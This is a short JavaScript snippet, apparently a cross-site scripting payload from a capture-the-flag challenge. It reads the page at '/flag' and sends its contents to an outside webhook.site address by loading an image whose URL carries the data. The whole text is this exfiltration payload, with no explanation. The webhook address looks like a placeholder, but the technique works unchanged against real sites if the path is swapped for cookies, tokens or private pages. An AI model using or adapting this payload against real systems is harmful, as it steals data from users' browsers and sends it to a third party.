fetch('/flag')
  .then(r => r.text())
  .then(flag => {
    new Image().src = 'https://webhook.site/12345678-abcd-efgh-ijkl-987654321?f=' + encodeURIComponent(flag);
  });
